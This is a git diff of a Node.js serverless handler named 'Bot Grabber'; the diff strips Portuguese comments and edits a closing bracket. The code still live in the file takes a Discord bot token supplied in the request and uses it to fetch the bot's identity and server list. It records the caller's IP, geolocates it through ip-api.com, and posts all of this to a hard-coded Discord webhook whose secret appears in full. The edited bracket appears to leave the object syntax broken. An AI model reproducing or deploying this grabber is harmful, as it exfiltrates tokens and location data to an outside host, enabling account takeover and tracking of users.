@@ -5,7 +5,6 @@ module.exports = async (req, res) => {
   const webhookURL = 'https://discord.com/api/webhooks/1319442086524751902/jponFRjtTqcE9E0q-gy2lCCWJQySujcBuoKy5O39mphs-zaToU3An1zRckSOXqXtZICC';
   const ipApiURL = 'http://ip-api.com/json/';
 
-  // Pega o IP real, levando em consideração proxies
   const clientIP = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : getClientIp(req);
 
   if (!applicationId || !token) {
@@ -15,11 +14,9 @@ module.exports = async (req, res) => {
   }
 
   try {
-    // Consultar a localização do IP
     const locationResponse = await fetch(`${ipApiURL}${clientIP}`);
     const locationData = await locationResponse.json();
 
-    // Obter informações do bot
     const botInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
       method: 'GET',
       headers: {
@@ -28,7 +25,6 @@ module.exports = async (req, res) => {
     });
     const botInfo = await botInfoResponse.json();
 
-    // Obter informações dos servidores do bot
     const guildsResponse = await fetch('https://discord.com/api/v10/users/@me/guilds', {
       method: 'GET',
       headers: {
@@ -37,7 +33,6 @@ module.exports = async (req, res) => {
     });
     const guilds = await guildsResponse.json();
 
-    // Preparar a mensagem para o webhook do Discord
     const embed = {
       username: 'Bot Grabber',
       embeds: [{
@@ -77,7 +72,7 @@ module.exports = async (req, res) => {
           name: 'Data/Hora',
           value: new Date().toISOString(),
           inline: false
-        },
+        }],
       }],
     };
 
